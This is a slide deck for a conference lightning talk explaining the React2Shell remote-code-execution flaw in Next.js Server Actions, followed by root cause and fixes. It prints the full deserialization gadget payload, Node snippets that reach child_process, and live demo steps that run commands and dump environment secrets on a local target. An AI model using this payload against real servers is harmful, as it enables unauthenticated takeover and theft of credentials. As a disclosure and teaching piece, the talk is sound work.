---
title: React2Shell RCE Vulnerability
sub_title:  CVE-2025-55182
event: Vehikl Lightning Talks
date: 02-27-2026
author: Cole Foster
theme:
  name: catppuccin-mocha
options:
  end_slide_shorthand: true
---

Intro
===
# CVE-2025-55182 — **React2Shell**
### Unauthenticated RCE via Next.js Server Actions

```
Affects:   react-server-dom-webpack,           19.0, 19.1.0, 19.1.1, 19.2.0  
           react-server-dom-parcel, 
           react-server-dom-turbopack
        
           Next.js                             16.0.0 – 16.0.6
            
Vector:   Unauthenticated HTTP POST 
CVSS:     10.0 - Critical
Impact:   Full server-side code execution

```
---
Context
===
## Server Actions

Next.js Server Actions let you define server-side functions and call them
directly from the browser no API route.

```typescript
"use server"
async function submitOrder(item: string, qty: number) {
  await db.insert({ item, qty })
  return { ok: true }
}
```

```tsx
// Bind to a form — the framework wires up the HTTP layer
<form action={submitOrder}>…</form>
```

<!-- pause -->

On form submission, the browser POSTs to the page URL.
Next.js routes it to the right function via an ID in the headers.


---
Context 
===
## The RSC Flight Wire Format

The POST carries two special headers:

```
Next-Action: <sha256-hash>    ←  which function to call
Content-Type: multipart/form-data    
```

<!-- pause -->

The body is **RSC Flight** — a line-delimited chunk protocol that encodes
complex JavaScript object graphs using cross-chunk references:

```
0:["$1"]                                        ← arg list; $1 = ref to chunk 1
1:{"object":"company","name":"$2:companyName"}  ← $2:key = chunk 2 property
2:{"companyName":"Resecurity"}                  ← concrete value
```

<!-- pause -->

Resolving a chunk is **active** — the decoder calls constructors and methods.
That is the primitive the exploit abuses.

---

## Live — Normal Request

`normal-request-multipart.hurl`

```bash +exec
cat normal-request-multipart.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --no-color \
     normal-request-multipart.hurl 2>&1
```

_400/404 expected — action hash is fake. The server validated the ID before reading the body._

---

## The Gadget Chain

Two multipart fields. No custom classes, no memory corruption.
Only JavaScript's own prototype chain.

```json
Field "0": {
  "then":      "$1:__proto__:then",
  "status":    "resolved_model",
  "reason":    -1,
  "value":     "{\"then\":\"$B0\"}",
  "_response": {
    "_prefix":   "<your command>;//",
    "_formData": { "get": "$1:constructor:constructor" }
  }
}

Field "1": "$@0"
```

Three moving parts.

---

## Part A — Thenables and `"$@0"`

JavaScript's Promise protocol is **duck-typed** — no `instanceof Promise` check.
Any object with a `.then` method is treated as a thenable and auto-resolved:

```bash +exec
node -e "
const thenable = {
  then: function(resolve) {
    console.log('  .then() was called automatically by the runtime')
    resolve('the resolved value')
  }
}

Promise.resolve(thenable).then(function(v) {
  console.log('  result:', v)
})
"
```

<!-- pause -->

RSC Flight uses the same protocol. **`\"\$@0\"`** marks chunk 0 as async.
The decoder awaits it — calling `.then()` on whatever chunk 0 decodes to.

Chunk 0 has `\"then\": \"\$1:__proto__:then\"` — this injects a `.then`
onto the response object's prototype, making it a live thenable.

**decoder resolves → runtime calls `.then()` → chain fires**

---

## Part B — `constructor.constructor === Function`

Every JavaScript object has `.constructor` — the class that made it.
Every class is a function, so its `.constructor` is `Function`. Always.

```bash +exec
node -e "
const obj = {}
console.log('obj.constructor.name:             ', obj.constructor.name)
console.log('obj.constructor.constructor.name: ', obj.constructor.constructor.name)
"
```

<!-- pause -->

`Function` is JavaScript's built-in eval — it takes a string and executes it:

```bash +exec
node -e "
const obj = {}
const F = obj.constructor.constructor

console.log('F === Function:', F === Function)
console.log('F(\"return 1 + 1\")():            ', F('return 1 + 1')())
console.log('F(\"return process.version\")():  ', F('return process.version')())
"
```

<!-- pause -->

In the gadget `_formData.get` resolves to `\$1:constructor:constructor` = `Function`.
The decoder calls `Function(_prefix + ...)()` — `_prefix` is the shell command,
followed by `//` to comment out the remainder.

---

## Part C — `process.mainModule.require`

Next.js compiles server code as **ES Modules**. In ESM, bare `require()` is undefined.
But `process.mainModule` is the CommonJS entry that bootstrapped Node — it always has `require`:

```bash +exec
node -e "
console.log('typeof require:                       ', typeof require)
console.log('typeof process.mainModule.require:    ', typeof process.mainModule.require)

const { execSync } = process.mainModule.require('child_process')
console.log('execSync available:', typeof execSync)
"
```

_Works in any Node.js process regardless of how the module was loaded._

---

## Live — Step 1: Probe

Confirm the endpoint exists. Any response means the target is live.

```bash +exec
cat exploit-1-probe.hurl
```

<!-- pause -->

```bash +exec
hurl exploit-1-probe.hurl 2>&1
```

---

## Live — Step 2: RCE

Write `id` output to `/tmp/pwned.txt` — executed **during deserialization**,
before Next.js checks whether the action ID is valid.

```bash +exec
cat exploit-2-rce.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --max-time 10 \
     --no-color \
     exploit-2-rce.hurl 2>&1
```

_500 "action not found" — `decodeReply()` already ran. The file is written._

---

## Live — Step 3: Env Dump

Write all of `process.env` to `/tmp/env_dump.json` —
`DATABASE_URL`, `JWT_SECRET`, `AWS_SECRET_ACCESS_KEY`, everything.

```bash +exec
cat exploit-3-env-dump.hurl
```

<!-- pause -->

```bash +exec
hurl --variable host="${HOST:-http://localhost:3000}" \
     --max-time 10 \
     --no-color \
     exploit-3-env-dump.hurl 2>&1
```

---

## Summary

**3 requests. No auth. No account. No knowledge of the target app.**

<!-- pause -->

**Root cause**

Multipart deserialization runs before action ID validation.
The decoder actively constructs objects:

- Thenables auto-call `.then()` — duck-typed Promise resolution
- `constructor.constructor === Function` — every object, always
- `Function(string)()` is eval — no imports, no setup

<!-- pause -->

**Fix**

- ✅  Upgrade to **Next.js ≥ 16.0.7** — moves ID check before `decodeReply()`
- ✅  WAF: block multipart POSTs where `Next-Action` value is < 32 chars
- ✅  Runtime: deny `process.mainModule` access in server action context
